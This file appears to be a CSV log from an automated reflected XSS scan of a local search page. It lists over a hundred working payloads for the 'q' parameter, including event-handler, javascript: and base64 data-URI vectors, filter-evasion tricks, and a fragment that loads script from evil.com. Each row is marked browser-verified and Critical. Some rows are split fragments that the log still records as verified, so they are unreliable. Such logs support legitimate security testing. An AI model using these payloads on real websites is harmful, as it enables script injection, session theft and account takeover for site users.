Payload_Start_Time,Payload_End_Time,Duration_Seconds,Target_URL,HTTP_Method,Parameter,Payload,Reflection_Type,Browser_Verified,XSS_Event_Type,Severity
2026-01-10 14:26:04.922,2026-01-10 14:26:04.930,0.008,http://localhost:3000/search,GET,q,<div data-x=x onclick=alert(1)>X</div>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.930,2026-01-10 14:26:04.934,0.004,http://localhost:3000/search,GET,q,<input accesskey=x onclick=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.934,2026-01-10 14:26:04.938,0.004,http://localhost:3000/search,GET,q,<div contenteditable oninput=alert(1)>X</div>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.938,2026-01-10 14:26:04.946,0.008,http://localhost:3000/search,GET,q,<input type=hidden onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.946,2026-01-10 14:26:04.950,0.004,http://localhost:3000/search,GET,q,<select><option oninput=alert(1)>X</option></select>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.950,2026-01-10 14:26:04.953,0.003,http://localhost:3000/search,GET,q,"<img/src=""x""/onerror=alert(1)>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.953,2026-01-10 14:26:04.957,0.004,http://localhost:3000/search,GET,q,<img%20src=x%20onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.957,2026-01-10 14:26:04.966,0.010,http://localhost:3000/search,GET,q,<img	src=x	onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.966,2026-01-10 14:26:04.970,0.003,http://localhost:3000/search,GET,q,<script	>alert(1)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.970,2026-01-10 14:26:04.972,0.003,http://localhost:3000/search,GET,q,<script,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.972,2026-01-10 14:26:04.980,0.008,http://localhost:3000/search,GET,q,>alert(1)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.980,2026-01-10 14:26:04.986,0.005,http://localhost:3000/search,GET,q,<script,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.986,2026-01-10 14:26:04.989,0.003,http://localhost:3000/search,GET,q,src=//evil.com></script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.989,2026-01-10 14:26:04.998,0.009,http://localhost:3000/search,GET,q,<svg/onload=prompt(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.998,2026-01-10 14:26:05.001,0.003,http://localhost:3000/search,GET,q,<svg/onload=confirm(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.001,2026-01-10 14:26:05.004,0.003,http://localhost:3000/search,GET,q,<svg/onload=print()>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.005,2026-01-10 14:26:05.008,0.003,http://localhost:3000/search,GET,q,<marquee onstart=prompt(1)>X</marquee>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.008,2026-01-10 14:26:05.012,0.004,http://localhost:3000/search,GET,q,<marquee onstart=confirm(1)>X</marquee>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.012,2026-01-10 14:26:05.021,0.009,http://localhost:3000/search,GET,q,<iframe/src=javascript:alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.021,2026-01-10 14:26:05.026,0.005,http://localhost:3000/search,GET,q,<iframe/onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.026,2026-01-10 14:26:05.030,0.004,http://localhost:3000/search,GET,q,<iframe%20src=javascript:alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.030,2026-01-10 14:26:05.033,0.004,http://localhost:3000/search,GET,q,<object/data=javascript:alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.033,2026-01-10 14:26:05.042,0.009,http://localhost:3000/search,GET,q,"<object data=""data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="">",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.042,2026-01-10 14:26:05.047,0.005,http://localhost:3000/search,GET,q,<embed/src=javascript:alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.047,2026-01-10 14:26:05.055,0.008,http://localhost:3000/search,GET,q,"<embed src=data:text/html,<script>alert(1)</script>>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.055,2026-01-10 14:26:05.059,0.004,http://localhost:3000/search,GET,q,<var onmouseover=alert(1)>X</var>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.059,2026-01-10 14:26:05.063,0.004,http://localhost:3000/search,GET,q,<code onmouseover=alert(1)>X</code>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.063,2026-01-10 14:26:05.071,0.008,http://localhost:3000/search,GET,q,<span onmouseover=alert(1)>X</span>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.071,2026-01-10 14:26:05.075,0.004,http://localhost:3000/search,GET,q,<p onmouseover=alert(1)>X</p>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.075,2026-01-10 14:26:05.078,0.003,http://localhost:3000/search,GET,q,<h1 onmouseover=alert(1)>X</h1>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.078,2026-01-10 14:26:05.082,0.004,http://localhost:3000/search,GET,q,<h2 onmouseover=alert(1)>X</h2>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.082,2026-01-10 14:26:05.089,0.007,http://localhost:3000/search,GET,q,<pre onmouseover=alert(1)>X</pre>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.089,2026-01-10 14:26:05.092,0.003,http://localhost:3000/search,GET,q,<blockquote onmouseover=alert(1)>X</blockquote>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.092,2026-01-10 14:26:05.097,0.004,http://localhost:3000/search,GET,q,<ol onmouseover=alert(1)><li>X</li></ol>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.097,2026-01-10 14:26:05.100,0.003,http://localhost:3000/search,GET,q,<ul onmouseover=alert(1)><li>X</li></ul>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.100,2026-01-10 14:26:05.107,0.007,http://localhost:3000/search,GET,q,<li onmouseover=alert(1)>X</li>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.107,2026-01-10 14:26:05.111,0.004,http://localhost:3000/search,GET,q,<dl onmouseover=alert(1)><dt>X</dt></dl>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.111,2026-01-10 14:26:05.115,0.004,http://localhost:3000/search,GET,q,<dt onmouseover=alert(1)>X</dt>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.115,2026-01-10 14:26:05.118,0.003,http://localhost:3000/search,GET,q,<dd onmouseover=alert(1)>X</dd>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.118,2026-01-10 14:26:05.125,0.007,http://localhost:3000/search,GET,q,<fieldset onmouseover=alert(1)>X</fieldset>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.125,2026-01-10 14:26:05.128,0.004,http://localhost:3000/search,GET,q,<legend onmouseover=alert(1)>X</legend>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.128,2026-01-10 14:26:05.133,0.004,http://localhost:3000/search,GET,q,<label onmouseover=alert(1)>X</label>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.133,2026-01-10 14:26:05.137,0.004,http://localhost:3000/search,GET,q,<table><caption onmouseover=alert(1)>X</caption></table>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.137,2026-01-10 14:26:05.147,0.010,http://localhost:3000/search,GET,q,<table><colgroup onmouseover=alert(1)></colgroup></table>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.147,2026-01-10 14:26:05.152,0.005,http://localhost:3000/search,GET,q,<table><col onmouseover=alert(1)></table>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.152,2026-01-10 14:26:05.156,0.004,http://localhost:3000/search,GET,q,<table><thead onmouseover=alert(1)></thead></table>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.156,2026-01-10 14:26:05.162,0.006,http://localhost:3000/search,GET,q,<table><tbody onmouseover=alert(1)></tbody></table>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.162,2026-01-10 14:26:05.167,0.005,http://localhost:3000/search,GET,q,<table><tfoot onmouseover=alert(1)></tfoot></table>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.167,2026-01-10 14:26:05.179,0.012,http://localhost:3000/search,GET,q,<table><tr onmouseover=alert(1)></tr></table>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.179,2026-01-10 14:26:05.182,0.004,http://localhost:3000/search,GET,q,<table><th onmouseover=alert(1)>X</th></table>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.182,2026-01-10 14:26:05.193,0.011,http://localhost:3000/search,GET,q,<table><td onmouseover=alert(1)>X</td></table>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.193,2026-01-10 14:26:05.199,0.005,http://localhost:3000/search,GET,q,<meter onmouseover=alert(1)>X</meter>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.199,2026-01-10 14:26:05.202,0.003,http://localhost:3000/search,GET,q,<progress onmouseover=alert(1)>X</progress>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.202,2026-01-10 14:26:05.206,0.004,http://localhost:3000/search,GET,q,<output onmouseover=alert(1)>X</output>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.206,2026-01-10 14:26:05.214,0.008,http://localhost:3000/search,GET,q,<time onmouseover=alert(1)>X</time>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.214,2026-01-10 14:26:05.219,0.005,http://localhost:3000/search,GET,q,<mark onmouseover=alert(1)>X</mark>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.219,2026-01-10 14:26:05.222,0.003,http://localhost:3000/search,GET,q,<ruby onmouseover=alert(1)>X</ruby>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.222,2026-01-10 14:26:05.229,0.007,http://localhost:3000/search,GET,q,<ruby><rt onmouseover=alert(1)>X</rt></ruby>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.229,2026-01-10 14:26:05.234,0.004,http://localhost:3000/search,GET,q,<ruby><rp onmouseover=alert(1)>X</rp></ruby>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.234,2026-01-10 14:26:05.237,0.003,http://localhost:3000/search,GET,q,<bdi onmouseover=alert(1)>X</bdi>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.237,2026-01-10 14:26:05.245,0.008,http://localhost:3000/search,GET,q,<bdo onmouseover=alert(1)>X</bdo>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.245,2026-01-10 14:26:05.250,0.004,http://localhost:3000/search,GET,q,<wbr onmouseover=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.250,2026-01-10 14:26:05.253,0.004,http://localhost:3000/search,GET,q,<ins onmouseover=alert(1)>X</ins>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.253,2026-01-10 14:26:05.256,0.003,http://localhost:3000/search,GET,q,<del onmouseover=alert(1)>X</del>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.256,2026-01-10 14:26:05.264,0.008,http://localhost:3000/search,GET,q,<small onmouseover=alert(1)>X</small>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.264,2026-01-10 14:26:05.268,0.004,http://localhost:3000/search,GET,q,<strong onmouseover=alert(1)>X</strong>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.268,2026-01-10 14:26:05.271,0.003,http://localhost:3000/search,GET,q,<em onmouseover=alert(1)>X</em>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.271,2026-01-10 14:26:05.279,0.008,http://localhost:3000/search,GET,q,<b onmouseover=alert(1)>X</b>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.279,2026-01-10 14:26:05.283,0.004,http://localhost:3000/search,GET,q,<i onmouseover=alert(1)>X</i>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.283,2026-01-10 14:26:05.286,0.003,http://localhost:3000/search,GET,q,<u onmouseover=alert(1)>X</u>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.286,2026-01-10 14:26:05.289,0.003,http://localhost:3000/search,GET,q,<s onmouseover=alert(1)>X</s>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.289,2026-01-10 14:26:05.296,0.008,http://localhost:3000/search,GET,q,<sub onmouseover=alert(1)>X</sub>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.297,2026-01-10 14:26:05.302,0.005,http://localhost:3000/search,GET,q,<sup onmouseover=alert(1)>X</sup>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.302,2026-01-10 14:26:05.305,0.003,http://localhost:3000/search,GET,q,<abbr onmouseover=alert(1)>X</abbr>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.305,2026-01-10 14:26:05.312,0.007,http://localhost:3000/search,GET,q,<address onmouseover=alert(1)>X</address>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.312,2026-01-10 14:26:05.317,0.005,http://localhost:3000/search,GET,q,<article onmouseover=alert(1)>X</article>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.317,2026-01-10 14:26:05.320,0.003,http://localhost:3000/search,GET,q,<aside onmouseover=alert(1)>X</aside>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.321,2026-01-10 14:26:05.329,0.008,http://localhost:3000/search,GET,q,<footer onmouseover=alert(1)>X</footer>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.329,2026-01-10 14:26:05.334,0.005,http://localhost:3000/search,GET,q,<header onmouseover=alert(1)>X</header>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.334,2026-01-10 14:26:05.337,0.003,http://localhost:3000/search,GET,q,<hgroup onmouseover=alert(1)>X</hgroup>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.337,2026-01-10 14:26:05.340,0.003,http://localhost:3000/search,GET,q,<nav onmouseover=alert(1)>X</nav>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.340,2026-01-10 14:26:05.349,0.010,http://localhost:3000/search,GET,q,<section onmouseover=alert(1)>X</section>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.349,2026-01-10 14:26:05.353,0.003,http://localhost:3000/search,GET,q,<main onmouseover=alert(1)>X</main>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.353,2026-01-10 14:26:05.356,0.003,http://localhost:3000/search,GET,q,<figure onmouseover=alert(1)>X</figure>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.356,2026-01-10 14:26:05.364,0.008,http://localhost:3000/search,GET,q,<figcaption onmouseover=alert(1)>X</figcaption>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.364,2026-01-10 14:26:05.368,0.004,http://localhost:3000/search,GET,q,<dialog onmouseover=alert(1)>X</dialog>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.368,2026-01-10 14:26:05.372,0.003,http://localhost:3000/search,GET,q,<menu onmouseover=alert(1)>X</menu>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.372,2026-01-10 14:26:05.379,0.007,http://localhost:3000/search,GET,q,<menuitem onmouseover=alert(1)>X</menuitem>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.379,2026-01-10 14:26:05.383,0.003,http://localhost:3000/search,GET,q,<details><summary onmouseover=alert(1)>X</summary></details>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.383,2026-01-10 14:26:05.386,0.004,http://localhost:3000/search,GET,q,<canvas onmouseover=alert(1)>X</canvas>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.386,2026-01-10 14:26:05.389,0.003,http://localhost:3000/search,GET,q,<button onclick=alert(1)>X</button>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.389,2026-01-10 14:26:05.397,0.008,http://localhost:3000/search,GET,q,<button ondblclick=alert(1)>X</button>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.397,2026-01-10 14:26:05.402,0.005,http://localhost:3000/search,GET,q,<button onmousedown=alert(1)>X</button>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.402,2026-01-10 14:26:05.406,0.004,http://localhost:3000/search,GET,q,<button onmouseup=alert(1)>X</button>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.406,2026-01-10 14:26:05.414,0.008,http://localhost:3000/search,GET,q,"""><script>alert(1)</script>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.414,2026-01-10 14:26:05.418,0.005,http://localhost:3000/search,GET,q,'><script>alert(1)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.418,2026-01-10 14:26:05.421,0.003,http://localhost:3000/search,GET,q,"""></script><script>alert(1)</script>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.421,2026-01-10 14:26:05.430,0.008,http://localhost:3000/search,GET,q,';alert(1);//,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.430,2026-01-10 14:26:05.434,0.004,http://localhost:3000/search,GET,q,""";alert(1);//",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.434,2026-01-10 14:26:05.438,0.004,http://localhost:3000/search,GET,q,""" onmouseover=alert(1) x=""",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.438,2026-01-10 14:26:05.446,0.008,http://localhost:3000/search,GET,q,"""onmouseover=""alert(1)",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.446,2026-01-10 14:26:05.451,0.005,http://localhost:3000/search,GET,q,' onmouseover=alert(1) x=',RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.451,2026-01-10 14:26:05.454,0.004,http://localhost:3000/search,GET,q,""" autofocus onfocus=alert(1) x=""",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.454,2026-01-10 14:26:05.462,0.008,http://localhost:3000/search,GET,q,' autofocus onfocus=alert(1) x=',RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.462,2026-01-10 14:26:05.465,0.003,http://localhost:3000/search,GET,q,</script><script>alert(1)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.465,2026-01-10 14:26:05.469,0.004,http://localhost:3000/search,GET,q,</script><img src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.469,2026-01-10 14:26:05.472,0.003,http://localhost:3000/search,GET,q,</script><svg onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.472,2026-01-10 14:26:05.479,0.007,http://localhost:3000/search,GET,q,--><script>alert(1)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.479,2026-01-10 14:26:05.483,0.004,http://localhost:3000/search,GET,q,--!><script>alert(1)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.483,2026-01-10 14:26:05.486,0.003,http://localhost:3000/search,GET,q,<q/oncut=prompt(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.486,2026-01-10 14:26:05.490,0.004,http://localhost:3000/search,GET,q,<q/onclick=prompt(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.490,2026-01-10 14:26:05.498,0.008,http://localhost:3000/search,GET,q,<q/ondrag=prompt(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.498,2026-01-10 14:26:05.501,0.003,http://localhost:3000/search,GET,q,<q/onerror=prompt(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.501,2026-01-10 14:26:05.504,0.003,http://localhost:3000/search,GET,q,<a href=#x onclick=alert(1)>X</a>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.504,2026-01-10 14:26:05.512,0.007,http://localhost:3000/search,GET,q,<a name=x onclick=alert(1)>X</a>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.512,2026-01-10 14:26:05.517,0.005,http://localhost:3000/search,GET,q,<a href=x target=_blank onclick=alert(1)>X</a>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.517,2026-01-10 14:26:05.520,0.003,http://localhost:3000/search,GET,q,"'"">><marquee onstart=confirm(1)>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.520,2026-01-10 14:26:05.522,0.002,http://localhost:3000/search,GET,q,"'"">><marquee onstart=prompt(1)>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.522,2026-01-10 14:26:05.528,0.006,http://localhost:3000/search,GET,q,"'"">><div onmouseover=alert(1)>X</div>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.528,2026-01-10 14:26:05.532,0.004,http://localhost:3000/search,GET,q,<img src=x oneonerrorrror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.532,2026-01-10 14:26:05.535,0.003,http://localhost:3000/search,GET,q,<img src=x onerror=alert(1) onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.535,2026-01-10 14:26:05.538,0.003,http://localhost:3000/search,GET,q,<button formaction=javascript:alert(1)>X</button>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.538,2026-01-10 14:26:05.545,0.007,http://localhost:3000/search,GET,q,<input type=submit formaction=javascript:alert(1) value=X>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.545,2026-01-10 14:26:05.550,0.005,http://localhost:3000/search,GET,q,<form action=javascript:alert(1)><button>X</button></form>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.550,2026-01-10 14:26:05.553,0.003,http://localhost:3000/search,GET,q,<video poster=javascript:alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.553,2026-01-10 14:26:05.555,0.002,http://localhost:3000/search,GET,q,<html manifest=javascript:alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.555,2026-01-10 14:26:05.562,0.007,http://localhost:3000/search,GET,q,<html xmlns:xss><xss:script>alert(1)</xss:script></html>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.562,2026-01-10 14:26:05.566,0.004,http://localhost:3000/search,GET,q,<img lowsrc=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.566,2026-01-10 14:26:05.569,0.003,http://localhost:3000/search,GET,q,<img dynsrc=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.569,2026-01-10 14:26:05.572,0.003,http://localhost:3000/search,GET,q,<a href=vbscript:msgbox(1)>X</a>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.572,2026-01-10 14:26:05.579,0.008,http://localhost:3000/search,GET,q,<a href=about:blank>X</a>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.579,2026-01-10 14:26:05.583,0.003,http://localhost:3000/search,GET,q,"<input pattern="".*"" title=""test"" onmouseover=alert(1)>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.583,2026-01-10 14:26:05.586,0.003,http://localhost:3000/search,GET,q,"<input placeholder=""test"" onmouseover=alert(1)>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.586,2026-01-10 14:26:05.589,0.003,http://localhost:3000/search,GET,q,"<div title=""test"" onmouseover=alert(1)>X</div>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.589,2026-01-10 14:26:05.596,0.007,http://localhost:3000/search,GET,q,"<img alt=""test"" src=x onerror=alert(1)>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.596,2026-01-10 14:26:05.601,0.005,http://localhost:3000/search,GET,q,<blockquote cite=javascript:alert(1)>X</blockquote>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.601,2026-01-10 14:26:05.603,0.003,http://localhost:3000/search,GET,q,<img longdesc=javascript:alert(1) src=x>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.603,2026-01-10 14:26:05.607,0.003,http://localhost:3000/search,GET,q,<img usemap=#x src=x><map name=x><area onclick=alert(1)></map>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.607,2026-01-10 14:26:05.616,0.009,http://localhost:3000/search,GET,q,<img ismap src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.616,2026-01-10 14:26:05.619,0.003,http://localhost:3000/search,GET,q,<input dirname=test onchange=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.619,2026-01-10 14:26:05.622,0.003,http://localhost:3000/search,GET,q,<svg><script>alert&#40;1&#41;</script></svg>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.622,2026-01-10 14:26:05.630,0.008,http://localhost:3000/search,GET,q,<svg><script>alert&#x28;1&#x29;</script></svg>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.630,2026-01-10 14:26:05.636,0.005,http://localhost:3000/search,GET,q,<svg><script>&#97;lert(1)</script></svg>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.636,2026-01-10 14:26:05.638,0.003,http://localhost:3000/search,GET,q,"<div style=""xss:expression(alert(1))"">X</div>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.638,2026-01-10 14:26:05.646,0.008,http://localhost:3000/search,GET,q,"<div style=""background:expression(alert(1))"">X</div>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.646,2026-01-10 14:26:05.650,0.004,http://localhost:3000/search,GET,q,"<script type=importmap>{""imports"":{""x"":""javascript:alert(1)""}}</script>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.650,2026-01-10 14:26:05.654,0.003,http://localhost:3000/search,GET,q,<div id=x><template shadowroot=open><style>*{color:red}</style><img src=x onerror=alert(1)></template></div>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.654,2026-01-10 14:26:05.663,0.009,http://localhost:3000/search,GET,q,"<iframe src=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.663,2026-01-10 14:26:05.666,0.004,http://localhost:3000/search,GET,q,"<object data=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==>",RAW_REFLECTION,Yes,alert,Critical
